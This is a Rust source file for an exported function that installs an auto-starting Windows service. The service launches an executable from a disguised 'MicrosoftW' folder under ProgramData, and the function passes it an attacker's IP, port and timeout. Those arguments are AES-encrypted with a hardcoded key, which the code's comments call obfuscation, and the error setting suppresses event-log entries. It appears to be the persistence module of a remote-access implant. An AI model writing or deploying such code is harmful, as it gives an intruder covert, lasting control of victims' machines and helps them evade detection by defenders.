#![allow(non_snake_case)]
#![allow(unused_variables)]
#![allow(unreachable_patterns)]
use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm, Key,
};
use winapi::shared::minwindef::{BOOL, TRUE};
use windows::core::{s, PCSTR, PCWSTR};
use windows::Win32::System::Services::{
    CreateServiceA, OpenSCManagerW, ENUM_SERVICE_TYPE, SERVICE_ERROR, SERVICE_START_TYPE,
};

// https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Services/fn.OpenSCManagerA.html
// https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea
// https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicea
// https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicea

#[no_mangle]
pub extern "system" fn make_srv(
    IP: String,
    PORT: String,
    mut ServiceName: String,
    PEName: String,
    Timeout: String,
) -> BOOL {
    unsafe {
        let read_srv_db: bool;
        let serv_hands = OpenSCManagerW(PCWSTR::null(), PCWSTR::null(), 2);

        // Are we able to access the Service Manager database?
        match serv_hands {
            Ok(_) => read_srv_db = true,
            Err(_) => read_srv_db = false,
        }

        // If we can access the Service Manager database, can we create a service?
        if read_srv_db {
            // Concat binPath.
            let mut binaryPath: String = String::from("C:\\programdata\\MicrosoftW\\");
            binaryPath.push_str(&PEName);
            binaryPath.push_str(".exe \"");

            // Concat args.
            let mut iport: String = IP;
            iport.push_str(" ");
            iport.push_str(&PORT);
            iport.push_str(" ");
            iport.push_str(&ServiceName.clone());
            iport.push_str(" ");
            iport.push_str(&Timeout);

            // Encrypt service binary arguments for obfuscation.
            let key_string = "8a74e5c30a13e40f584b30b1dd66892d";
            let keyu: &[u8] = key_string.as_bytes();
            let key = Key::<Aes256Gcm>::from_slice(keyu);
            let non = Aes256Gcm::generate_nonce(&mut OsRng);
            let cyfer = Aes256Gcm::new(key);
            let enc_cyfer = cyfer.encrypt(&non, iport.as_bytes()).unwrap();
            let mut enc_data: Vec<u8> = non.to_vec();
            enc_data.extend_from_slice(&enc_cyfer);
            let fin_binPathArgs: String = hex::encode(enc_data);
            binaryPath.push_str(&fin_binPathArgs);

            // May need to null terminate to prevent reading into stack/heap.
            binaryPath.push_str("\"\0");
            ServiceName.push_str("\0");

            // Creating PCSTR types.
            let PCSTR_binaryPath: PCSTR = PCSTR(binaryPath.as_ptr() as *const u8);
            let PCSTR_srv_name: PCSTR = PCSTR(ServiceName.as_ptr() as *const u8);
            let PCSTR_LoadOrder: PCSTR = PCSTR("".as_ptr() as *const u8);
            let PCSTR_Dependencies: PCSTR = PCSTR("".as_ptr() as *const u8);

            // Creating service.
            let testman = CreateServiceA(
                serv_hands.unwrap(),        // hscmanager: SC_HANDLE
                PCSTR_srv_name,             // lpServiceName
                PCSTR::null(),              // lpDisplayName optional
                2,                          // dwDesiredAccess: 0x2 == Create Service
                ENUM_SERVICE_TYPE(0x10),    // dwServiceType:   0x10 == Run in own process
                SERVICE_START_TYPE(0x2),    // dwStartType: 0x2 == Auto
                SERVICE_ERROR(0x0), // dwErrorControl: 0x0 == ignore error; does not log in event logs
                PCSTR_binaryPath,   // lpBinaryPathName
                PCSTR_LoadOrder,    // lpLoadOrderGroup optional
                Some(std::ptr::null_mut()), // lpdwTagId optional
                PCSTR_Dependencies, // lpDependencies optional
                PCSTR::null(),      // lpServiceStartName optional
                PCSTR::null(),      // lpPassword optional
            );
        } else {
            let _null: Option<u32> = None; // How to run as administrator??
        }
    }
    return TRUE;
}
